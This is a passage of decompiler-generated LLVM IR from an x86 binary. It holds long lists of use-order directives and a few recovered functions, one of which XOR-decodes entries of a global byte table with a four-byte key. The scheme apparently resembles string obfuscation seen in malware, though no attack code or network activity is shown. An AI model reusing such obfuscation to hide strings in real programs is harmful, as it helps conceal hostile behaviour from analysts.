  uselistorder i32 %v0_804ff36, { 1, 0, 2 }
  uselistorder i32 %v3_804ff04, { 2, 1, 0 }
  uselistorder i32 %v0_804ff01, { 0, 2, 1 }
  uselistorder i32 %v0_804fedb, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804fe13, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804fd7b, { 1, 2, 0 }
  uselistorder i32 %v0_804fcfe, { 1, 2, 0 }
  uselistorder i32 %v0_804fc81, { 1, 2, 0 }
  uselistorder i32 %v0_805007c, { 1, 0 }
  uselistorder i32 %v2_804fbc1, { 1, 0, 2 }
  uselistorder i32 %v1_804fbbe, { 1, 0, 2 }
  uselistorder i32 %v0_804fbb7, { 1, 2, 0 }
  uselistorder i32 %v7_804fb43, { 1, 0 }
  uselistorder i32 %v0_804fb43, { 1, 2, 0 }
  uselistorder i32 %v5_804f5ff, { 1, 0 }
  uselistorder i32 %v4_804f5ff.be, { 2, 1, 0 }
  uselistorder i32 %v0_804f5ff, { 2, 1, 0 }
  uselistorder i32 %v1_804fb0e, { 2, 1, 0 }
  uselistorder i32 %v9_804fae6, { 1, 0 }
  uselistorder i32 %v0_804fdec, { 0, 2, 1 }
  uselistorder i32 %v5_804fab0, { 1, 2, 0 }
  uselistorder i32 %v4_804fab0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804faab, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_804ff83, { 1, 0 }
  uselistorder i32* %v1_804febe, { 2, 0, 1 }
  uselistorder i32 %v0_804fa40, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804fa1d, { 2, 1, 0 }
  uselistorder i32 %v9_804f9ec, { 1, 0 }
  uselistorder i32 %v0_804fcf2, { 0, 2, 1 }
  uselistorder i32 %v1_804f9d8, { 2, 1, 0 }
  uselistorder i32 %v9_804f9a7, { 1, 0 }
  uselistorder i32 %v0_804fc75, { 0, 2, 1 }
  uselistorder i32 %v9_804f910, { 1, 0 }
  uselistorder i32 %v1_804f909, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804f8e3, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_804f855, { 1, 0 }
  uselistorder i32 %v1_804f84e, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804f828, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_804f81d, { 2, 1, 0 }
  uselistorder i32 %v9_804f7ec, { 1, 0 }
  uselistorder i32 %v0_804fd6f, { 0, 2, 1 }
  uselistorder i32 %v0_804f743, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v0_804f717, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v9_804f6c1, { 1, 0 }
  uselistorder i32 %v1_804f6be, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804f69c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_804f67b, { 1, 0 }
  uselistorder i32 %v4_804f67b, { 0, 2, 1 }
  uselistorder i32 %v0_804f643, { 1, 0, 2 }
  uselistorder i8* %v1_804f631, { 1, 0, 2 }
  uselistorder i32 %v1_804f60e, { 1, 0, 2 }
  uselistorder i32 %v1_804fb20, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v3_804f5e0, { 1, 0 }
  uselistorder i32 %v0_804f5e0, { 0, 8, 1, 12, 2, 13, 3, 11, 4, 10, 5, 9, 6, 7, 14 }
  uselistorder i32 %v1_804f5cb, { 0, 2, 1 }
  uselistorder i32 %v0_804f5c7, { 1, 0 }
  uselistorder i32 %v0_804f5ae, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v0_804f541, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804f540, { 1, 0, 2 }
  uselistorder i16 %v1_804f54c, { 1, 0 }
  uselistorder i64 %v8_804f52d, { 1, 0 }
  uselistorder i32 %v0_804f4b5, { 2, 0, 1 }
  uselistorder i32 %v1_804f4b2, { 1, 0 }
  uselistorder i32 %v2_804f4af, { 1, 0 }
  uselistorder i32 %v3_804f4a3, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v1_804f48a, { 1, 0 }
  uselistorder i32 %v0_804f48a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804f465, { 1, 0 }
  uselistorder i32 %v2_804f462, { 1, 0 }
  uselistorder i32 %v0_804f460, { 1, 0 }
  uselistorder i32 %v2_804f415, { 1, 0 }
  uselistorder i32 %v2_804f3a6, { 1, 0 }
  uselistorder i32 %v3_804f3a3, { 1, 0, 2, 3 }
  uselistorder i1 %v9_804f382, { 1, 0 }
  uselistorder i32 %v1_804f382, { 1, 0 }
  uselistorder i32 %v3_804f37f, { 1, 0, 2 }
  uselistorder i32 %v2_804f37d, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v1_804f362, { 1, 0 }
  uselistorder i32 %v0_804f362, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804f34d, { 1, 0 }
  uselistorder i32 %v3_804f34a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804f398, { 1, 0 }
  uselistorder i32 %v1_804f395, { 2, 1, 0 }
  uselistorder i32 %v1_804f2bb, { 1, 0 }
  uselistorder i32 %v1_804f2b0, { 1, 0 }
  uselistorder i32 %v0_804f2b0, { 1, 0 }
  uselistorder i32 %v0_804f2b9, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804f28d, { 1, 0 }
  uselistorder i32 %v0_804f28d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_804f27c, { 1, 0, 2 }
  uselistorder i32 %v4_804f23b, { 2, 1, 0 }
  uselistorder i32 %v3_804f207, { 1, 0, 2 }
  uselistorder i32 %v1_804f1a3, { 1, 0 }
  uselistorder i32 %v1_804f0e3, { 2, 1, 0 }
  uselistorder i8 %v1_804efa6, { 1, 0 }
  uselistorder i1 %v4_804efa2, { 1, 0 }
  uselistorder i1 %v10_804ef88, { 1, 0 }
  uselistorder i8 %v1_804ef7a, { 1, 0 }
  uselistorder i1 %v4_804ef76, { 1, 0 }
  uselistorder i1 %v10_804ef5c, { 1, 0 }
  uselistorder i1 %v1_80508cb, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804ede8, { 0, 4, 1, 2, 3 }
  uselistorder i8 %v1_804ede5, { 7, 2, 3, 8, 16, 4, 5, 6, 0, 9, 10, 11, 12, 13, 14, 1, 15, 17 }
  uselistorder i32 %v0_804ec59, { 1, 0, 2 }
  uselistorder i32 %v0_80506d0, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v1_804ec40, { 2, 0, 1 }
  uselistorder i1 %tmp697, { 3, 0, 1, 2 }
  uselistorder i1 %v7_8050583, { 2, 0, 1, 3 }
  uselistorder i8 %v1_804eaa1, { 1, 0 }
  uselistorder i8 %v1_804e984, { 1, 0 }
  uselistorder i8 %v1_804e942, { 1, 0 }
  uselistorder i8 %v1_804e908, { 1, 0 }
  uselistorder i1 %v4_804e89a, { 1, 0 }
  uselistorder i1 %v11_804e880, { 1, 0 }
  uselistorder i8 %v1_804e832, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v1_804e80f, { 1, 0 }
  uselistorder i8 %v1_804e7d5, { 4, 0, 1, 3, 2, 5 }
  uselistorder i32 %v0_8050545, { 1, 0 }
  uselistorder i8 %v1_804e6fb, { 1, 4, 0, 5, 2, 3, 6 }
  uselistorder i8 %v1_804e6e0, { 3, 0, 1, 4, 2 }
  uselistorder i8 %v1_804e6b5, { 1, 0 }
  uselistorder i32 %v0_8050469, { 1, 0 }
  uselistorder i8 %v1_804e67b, { 1, 0 }
  uselistorder i32 %v0_8050490, { 1, 0 }
  uselistorder i32 %v0_80504a0, { 1, 0 }
  uselistorder i8 %v1_804e4ba, { 1, 0 }
  uselistorder i1 %v11_804e413, { 1, 0 }
  uselistorder i8 %.pre, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80504ee, { 1, 0 }
  uselistorder i8 %v2_804e2e7, { 2, 0, 1 }
  uselistorder i8 %v4_804e2e1, { 37, 20, 46, 4, 47, 19, 49, 3, 2, 1, 5, 6, 0, 57, 56, 7, 8, 9, 10, 11, 12, 13, 14, 34, 35, 36, 15, 16, 17, 38, 18, 48, 21, 45, 22, 23, 58, 24, 59, 25, 26, 39, 40, 41, 27, 42, 28, 29, 43, 44, 50, 51, 52, 30, 60, 31, 32, 33, 53, 61, 54, 55 }
  uselistorder i32 %v2_804e2e1, { 0, 2, 1 }
  uselistorder i32 %v1_804e2d6, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804e2d1, { 2, 1, 0, 3 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 7, 8, 9, 10, 11, 38, 12, 13, 14, 15, 0, 1, 2, 3, 4, 28, 29, 18, 19, 40, 41, 42, 39, 67, 5, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 30, 31, 32, 33, 34, 35, 36, 37, 64, 65, 68, 43, 44, 45, 46, 47, 48, 49, 52, 50, 51, 53, 54, 56, 57, 55, 58, 59, 60, 61, 62, 63, 66 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 3, 18, 19, 16, 4, 5, 12, 6, 7, 8, 17, 9, 10, 11, 13, 14, 15, 39, 20, 21, 22, 23, 25, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 76, 77, 78, 79, 80, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 81 }
  uselistorder i32* %eax.global-to-local, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 303, 139, 140, 179, 178, 180, 181, 182, 169, 170, 171, 172, 173, 141, 142, 143, 57, 58, 61, 59, 60, 62, 63, 64, 65, 66, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 128, 129, 130, 131, 132, 133, 134, 135, 136, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 273, 183, 184, 185, 186, 200, 187, 188, 189, 190, 191, 174, 175, 176, 177, 274, 21, 22, 265, 266, 267, 268, 269, 68, 69, 70, 71, 72, 73, 67, 74, 75, 76, 77, 78, 79, 80, 91, 92, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 137, 138, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 270, 271, 272, 275, 276, 277, 279, 278, 192, 193, 194, 195, 196, 197, 198, 199, 201, 202, 203, 204, 205, 206, 207, 210, 211, 301, 302, 251, 208, 209, 212, 213, 214, 217, 215, 216, 218, 219, 220, 221, 222, 228, 224, 225, 226, 223, 227, 229, 231, 230, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 252, 253, 254, 255, 256, 259, 257, 258, 260, 261, 262, 0, 263, 264, 304, 305, 280, 281, 282, 283, 284, 285, 286, 250, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 300, 299 }
  uselistorder i32 1908, { 1, 0 }
  uselistorder i32 1952, { 4, 2, 3, 0, 1 }
  uselistorder i32 ()* @function_8050970, { 13, 5, 4, 3, 2, 12, 15, 14, 6, 10, 9, 11, 8, 7, 1, 0 }
  uselistorder i32 ()* @function_8051070, { 3, 4, 2, 1, 0 }
  uselistorder i32 ()* @function_8050940, { 10, 9, 8, 11, 2, 6, 5, 7, 4, 3, 1, 0 }
  uselistorder i32 1944, { 0, 13, 10, 12, 3, 4, 5, 6, 7, 8, 9, 16, 14, 11, 15, 1, 2 }
  uselistorder i32 ()* @function_80509f0, { 9, 8, 10, 2, 6, 5, 7, 4, 3, 1, 0 }
  uselistorder i32 ()* @function_8051c16, { 22, 21, 20, 19, 18, 17, 16, 2, 1, 24, 23, 6, 5, 14, 13, 12, 11, 10, 9, 8, 7, 4, 3, 0, 15 }
  uselistorder i32 1936, { 1, 0, 2 }
  uselistorder i32 1636, { 1, 0, 2 }
  uselistorder i32 1764, { 1, 0, 2 }
  uselistorder i32 ()* @function_804dcd0, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0, 2 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i32 1924, { 1, 0, 2 }
  uselistorder i32 1928, { 0, 2, 1, 3, 4 }
  uselistorder i16* @global_var_80556b6.16, { 1, 0 }
  uselistorder i8 57, { 1, 0 }
  uselistorder i8 78, { 1, 0 }
  uselistorder i8 72, { 1, 0 }
  uselistorder i8 58, { 2, 3, 4, 11, 5, 10, 6, 7, 9, 8, 0, 1 }
  uselistorder i8 91, { 2, 0, 1 }
  uselistorder i8 -105, { 1, 0 }
  uselistorder i8 -4, { 2, 3, 4, 0, 1 }
  uselistorder i8 -40, { 1, 0, 2 }
  uselistorder i8 24, { 0, 2, 1 }
  uselistorder i8 -48, { 1, 0, 2 }
  uselistorder i8 36, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i8 -32, { 2, 1, 0 }
  uselistorder i8 95, { 2, 3, 0, 1 }
  uselistorder i8 -16, { 2, 0, 1 }
  uselistorder i8 -71, { 1, 0 }
  uselistorder i8 31, { 4, 0, 5, 7, 8, 1, 3, 2, 6 }
  uselistorder i8 61, { 1, 0 }
  uselistorder i8 -121, { 1, 0 }
  uselistorder i8 -3, { 6, 7, 8, 3, 4, 5, 0, 1, 2 }
  uselistorder i8 39, { 1, 0 }
  uselistorder i8 51, { 1, 0 }
  uselistorder i8 106, { 1, 0 }
  uselistorder i8 9, { 1, 0 }
  uselistorder i8 -1, { 13, 0, 6, 2, 7, 16, 17, 18, 8, 14, 15, 9, 10, 3, 4, 1, 11, 5, 12 }
  uselistorder i8 -19, { 1, 2, 3, 0 }
  uselistorder i8 -57, { 0, 2, 1 }
  uselistorder i8 -59, { 1, 0 }
  uselistorder i8 105, { 2, 0, 1 }
  uselistorder i8 -91, { 1, 0 }
  uselistorder i8 -113, { 2, 0, 1, 3, 4, 5 }
  uselistorder i8 112, { 2, 1, 3, 0 }
  uselistorder i8 -13, { 1, 0 }
  uselistorder i8 -122, { 1, 0 }
  uselistorder i8 5, { 2, 0, 3, 1 }
  uselistorder i8 -5, { 4, 1, 5, 7, 6, 3, 0, 2 }
  uselistorder i8 -124, { 1, 0 }
  uselistorder i8 -69, { 2, 1, 0 }
  uselistorder i8 63, { 2, 3, 1, 0, 4 }
  uselistorder i8 120, { 1, 0, 2, 3 }
  uselistorder i8 44, { 1, 0 }
  uselistorder i8 -98, { 1, 0, 2 }
  uselistorder i8 -99, { 1, 2, 0 }
  uselistorder i8 -72, { 1, 0 }
  uselistorder i8 -97, { 3, 0, 1, 2, 5, 4 }
  uselistorder i8 80, { 2, 0, 1 }
  uselistorder i8 -88, { 1, 0 }
  uselistorder i8 -64, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i8 55, { 1, 0, 3, 2 }
  uselistorder i8 33, { 1, 0 }
  uselistorder i8 21, { 0, 1, 3, 2 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i8 10, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 56, { 0, 2, 1 }
  uselistorder i8 15, { 1, 2, 3, 8, 4, 5, 6, 0, 9, 7 }
  uselistorder i8 127, { 2, 0, 1 }
  uselistorder i32 (i32)* @function_804d5c0, { 4, 2, 1, 0, 3 }
  uselistorder i32 1932, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050155, { 1, 0 }
  uselistorder label %dec_label_pc_804f56a.backedge, { 21, 4, 3, 0, 13, 5, 7, 1, 17, 6, 16, 8, 9, 18, 10, 11, 19, 12, 20, 14, 15, 2 }
  uselistorder label %dec_label_pc_804ffe2, { 1, 0 }
  uselistorder label %dec_label_pc_804ff43, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804fe5b, { 1, 0 }
  uselistorder label %dec_label_pc_804fdf8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc03, { 1, 0 }
  uselistorder label %dec_label_pc_804fb29, { 1, 0, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder label %dec_label_pc_804f5ff.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804fae6, { 1, 0 }
  uselistorder label %dec_label_pc_804faba, { 1, 0 }
  uselistorder label %dec_label_pc_804faab, { 2, 3, 1, 8, 4, 5, 0, 11, 6, 7, 9, 10 }
  uselistorder label %dec_label_pc_804f9ec, { 1, 0 }
  uselistorder label %dec_label_pc_804f9a7, { 1, 0 }
  uselistorder label %dec_label_pc_804f91e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f8fa, { 1, 0 }
  uselistorder label %dec_label_pc_804f863, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f83f, { 1, 0 }
  uselistorder label %dec_label_pc_804f7ec, { 1, 0 }
  uselistorder label %dec_label_pc_804f797, { 1, 0 }
  uselistorder label %dec_label_pc_804f6db, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f6cf, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f6af, { 1, 0 }
  uselistorder label %dec_label_pc_804f681, { 2, 1, 5, 3, 4, 6, 0 }
  uselistorder label %dec_label_pc_804f656, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f643, { 1, 0 }
  uselistorder label %dec_label_pc_804f631, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804f605, { 1, 0 }
  uselistorder label %dec_label_pc_804f605.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f5d0, { 1, 0 }
  uselistorder label %dec_label_pc_804f5cb, { 1, 0 }
  uselistorder label %dec_label_pc_804f589, { 1, 0 }
  uselistorder label %dec_label_pc_804f575, { 1, 0 }
  uselistorder label %dec_label_pc_804f47b, { 0, 5, 6, 7, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_804f460, { 1, 0 }
  uselistorder label %dec_label_pc_804f437, { 1, 0 }
  uselistorder label %dec_label_pc_804f353, { 3, 4, 5, 0, 1, 6, 2 }
  uselistorder label %dec_label_pc_804f322, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f2b0, { 1, 0 }
  uselistorder label %dec_label_pc_804f1bd, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804f1b2, { 1, 0 }
  uselistorder label %dec_label_pc_804f09f, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804f08f.thread, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804eee3, { 1, 0 }
  uselistorder label %dec_label_pc_804ed13, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804ecf3.dec_label_pc_804ed13_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_804ec83, { 1, 0 }
  uselistorder label %dec_label_pc_804ec49, { 1, 0 }
  uselistorder label %dec_label_pc_804e793, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804e779, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e72f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804e6fb, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e6c3, { 1, 0 }
  uselistorder label %dec_label_pc_804e684, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e5f4, { 1, 0 }
  uselistorder label %dec_label_pc_804e5dd, { 1, 0 }
  uselistorder label %dec_label_pc_804e5a8, { 1, 0 }
  uselistorder label %dec_label_pc_804e597, { 1, 0 }
  uselistorder label %dec_label_pc_804e586, { 1, 0 }
  uselistorder label %dec_label_pc_804e566, { 1, 0 }
  uselistorder label %dec_label_pc_804e413, { 1, 0 }
  uselistorder label %dec_label_pc_804e3e9, { 1, 0 }
  uselistorder label %dec_label_pc_804e2d1, { 148, 29, 149, 150, 151, 152, 153, 154, 159, 42, 43, 45, 48, 49, 51, 160, 56, 161, 162, 57, 58, 163, 155, 59, 156, 164, 165, 166, 167, 61, 62, 20, 63, 64, 70, 72, 1, 73, 75, 76, 77, 21, 78, 168, 79, 157, 158, 80, 169, 0, 170, 81, 74, 171, 172, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 82, 173, 83, 174, 84, 71, 66, 65, 69, 68, 85, 67, 22, 23, 25, 24, 26, 86, 28, 27, 30, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 87, 44, 40, 39, 88, 89, 90, 41, 185, 31, 32, 33, 34, 35, 36, 37, 91, 38, 46, 47, 50, 92, 53, 52, 54, 93, 55, 213, 2, 214, 215, 95, 94, 216, 217, 218, 219, 97, 96, 186, 98, 99, 100, 101, 102, 187, 103, 104, 105, 188, 106, 107, 108, 109, 110, 111, 112, 113, 189, 114, 3, 115, 60, 4, 116, 190, 191, 192, 193, 194, 195, 196, 197, 117, 198, 199, 200, 118, 201, 202, 203, 204, 205, 206, 207, 119, 208, 5, 6, 7, 8, 122, 121, 120, 123, 209, 210, 211, 124, 212, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 147, 146, 220 }
}

define i32 @function_8050940() local_unnamed_addr {
dec_label_pc_8050940:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8050948 = icmp eq i32 %tmp, 0
  %v1_805094a = mul i32 %tmp2, 8
  store i32 %v1_805094a, i32* %edx.global-to-local, align 4
  br i1 %v1_8050948, label %dec_label_pc_8050963, label %dec_label_pc_8050959

dec_label_pc_8050959:                             ; preds = %dec_label_pc_8050940
  %v1_8050959 = add i32 %v1_805094a, add (i32 ptrtoint (i32* @global_var_8055740.28 to i32), i32 4)
  %v2_8050959 = inttoptr i32 %v1_8050959 to i32*
  %v3_8050959 = load i32, i32* %v2_8050959, align 4
  %v1_805095c = urem i32 %v3_8050959, 65536
  %v2_8050961 = inttoptr i32 %tmp to i32*
  store i32 %v1_805095c, i32* %v2_8050961, align 4
  %v0_8050963.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050963

dec_label_pc_8050963:                             ; preds = %dec_label_pc_8050940, %dec_label_pc_8050959
  %v0_8050963 = phi i32 [ %v1_805094a, %dec_label_pc_8050940 ], [ %v0_8050963.pre, %dec_label_pc_8050959 ]
  %v1_8050963 = add i32 %v0_8050963, ptrtoint (i32* @global_var_8055740.28 to i32)
  %v2_8050963 = inttoptr i32 %v1_8050963 to i32*
  %v3_8050963 = load i32, i32* %v2_8050963, align 4
  ret i32 %v3_8050963

; uselistorder directives
  uselistorder label %dec_label_pc_8050963, { 1, 0 }
}

define i32 @function_8050970() local_unnamed_addr {
dec_label_pc_8050970:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_8050979 = zext i8 %tmp to i32
  %v1_805097d = mul nuw nsw i32 %v4_8050979, 8
  %v2_805097d = add i32 %v1_805097d, ptrtoint (i32* @global_var_8055740.28 to i32)
  store i32 %v2_805097d, i32* %ecx.global-to-local, align 4
  %v0_8050984 = load i16, i16* @global_var_80555d8.29, align 2
  %v1_8050984 = sext i16 %v0_8050984 to i32
  %v1_8050989 = add i32 %v1_805097d, add (i32 ptrtoint (i32* @global_var_8055740.28 to i32), i32 4)
  %v2_8050989 = inttoptr i32 %v1_8050989 to i16*
  %v3_8050989 = load i16, i16* %v2_8050989, align 4
  %v4_8050989 = icmp eq i16 %v3_8050989, 0
  br i1 %v4_8050989, label %dec_label_pc_80509da, label %dec_label_pc_8050990

dec_label_pc_8050990:                             ; preds = %dec_label_pc_8050970
  store i32 %v1_8050984, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8050998 = udiv i32 %v1_8050984, 16777216
  %v2_805099b = udiv i32 %v1_8050984, 256
  store i32 %v2_805099b, i32* %edi.global-to-local, align 4
  %v5_805099e = trunc i32 %v2_8050998 to i8
  store i8 %v5_805099e, i8* %stack_var_-44, align 1
  %v2_80509a1 = udiv i32 %v1_8050984, 65536
  store i32 %v2_80509a1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80509a4

dec_label_pc_80509a4:                             ; preds = %dec_label_pc_80509a4.dec_label_pc_80509a4_crit_edge, %dec_label_pc_8050990
  %v0_80509aa = phi i32 [ %v0_80509aa.pre, %dec_label_pc_80509a4.dec_label_pc_80509a4_crit_edge ], [ %v1_8050984, %dec_label_pc_8050990 ]
  %v0_80509a6 = phi i32 [ %v1_80509d6, %dec_label_pc_80509a4.dec_label_pc_80509a4_crit_edge ], [ 0, %dec_label_pc_8050990 ]
  %v0_80509a4 = phi i32 [ %v0_80509ce, %dec_label_pc_80509a4.dec_label_pc_80509a4_crit_edge ], [ %v2_805097d, %dec_label_pc_8050990 ]
  %v1_80509a4 = inttoptr i32 %v0_80509a4 to i32*
  %v2_80509a4 = load i32, i32* %v1_80509a4, align 4
  %v2_80509a8 = add i32 %v2_80509a4, %v0_80509a6
  %v1_80509ac = inttoptr i32 %v2_80509a8 to i8*
  %v2_80509ac = load i8, i8* %v1_80509ac, align 1
  %v4_80509ac = trunc i32 %v0_80509aa to i8
  %v5_80509ac = xor i8 %v2_80509ac, %v4_80509ac
  store i8 %v5_80509ac, i8* %v1_80509ac, align 1
  %v0_80509ae = load i32, i32* %edx.global-to-local, align 4
  %v0_80509b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80509b0 = inttoptr i32 %v0_80509b0 to i32*
  %v2_80509b0 = load i32, i32* %v1_80509b0, align 4
  %v2_80509b2 = add i32 %v2_80509b0, %v0_80509ae
  %v0_80509b4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80509b6 = inttoptr i32 %v2_80509b2 to i8*
  %v2_80509b6 = load i8, i8* %v1_80509b6, align 1
  %v4_80509b6 = trunc i32 %v0_80509b4 to i8
  %v5_80509b6 = xor i8 %v2_80509b6, %v4_80509b6
  store i8 %v5_80509b6, i8* %v1_80509b6, align 1
  %v0_80509b8 = load i32, i32* %edx.global-to-local, align 4
  %v0_80509ba = load i32, i32* %ecx.global-to-local, align 4
  %v1_80509ba = inttoptr i32 %v0_80509ba to i32*
  %v2_80509ba = load i32, i32* %v1_80509ba, align 4
  %v2_80509bc = add i32 %v2_80509ba, %v0_80509b8
  %v0_80509be = load i32, i32* %esi.global-to-local, align 4
  %v1_80509c0 = inttoptr i32 %v2_80509bc to i8*
  %v2_80509c0 = load i8, i8* %v1_80509c0, align 1
  %v4_80509c0 = trunc i32 %v0_80509be to i8
  %v5_80509c0 = xor i8 %v2_80509c0, %v4_80509c0
  store i8 %v5_80509c0, i8* %v1_80509c0, align 1
  %v0_80509c2 = load i32, i32* %edx.global-to-local, align 4
  %v0_80509c4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80509c4 = inttoptr i32 %v0_80509c4 to i32*
  %v2_80509c4 = load i32, i32* %v1_80509c4, align 4
  %v1_80509c6 = add i32 %v0_80509c2, 1
  store i32 %v1_80509c6, i32* %edx.global-to-local, align 4
  %v2_80509c7 = add i32 %v2_80509c4, %v0_80509c2
  %v2_80509c9 = load i8, i8* %stack_var_-44, align 1
  %v1_80509cc = inttoptr i32 %v2_80509c7 to i8*
  %v2_80509cc = load i8, i8* %v1_80509cc, align 1
  %v5_80509cc = xor i8 %v2_80509cc, %v2_80509c9
  store i8 %v5_80509cc, i8* %v1_80509cc, align 1
  %v0_80509ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_80509ce = add i32 %v0_80509ce, 4
  %v2_80509ce = inttoptr i32 %v1_80509ce to i32*
  %v3_80509ce = load i32, i32* %v2_80509ce, align 4
  %v1_80509d1 = urem i32 %v3_80509ce, 65536
  %v1_80509d6 = load i32, i32* %edx.global-to-local, align 4
  %v8_80509d8 = icmp sgt i32 %v1_80509d1, %v1_80509d6
  br i1 %v8_80509d8, label %dec_label_pc_80509a4.dec_label_pc_80509a4_crit_edge, label %dec_label_pc_80509da

dec_label_pc_80509a4.dec_label_pc_80509a4_crit_edge: ; preds = %dec_label_pc_80509a4
  %v0_80509aa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80509a4

dec_label_pc_80509da:                             ; preds = %dec_label_pc_80509a4, %dec_label_pc_8050970
  %v0_80509e1 = phi i32 [ %v1_8050984, %dec_label_pc_8050970 ], [ %v1_80509d1, %dec_label_pc_80509a4 ]
  ret i32 %v0_80509e1

; uselistorder directives
  uselistorder i32 %v1_80509d6, { 1, 0 }
  uselistorder i32 %v1_80509d1, { 1, 0 }
  uselistorder i32 %v0_80509ce, { 1, 0 }
  uselistorder i32 %v1_8050984, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_80509f0() local_unnamed_addr {
dec_label_pc_80509f0:
  %ebp.global-to-local = alloca i32, align 4
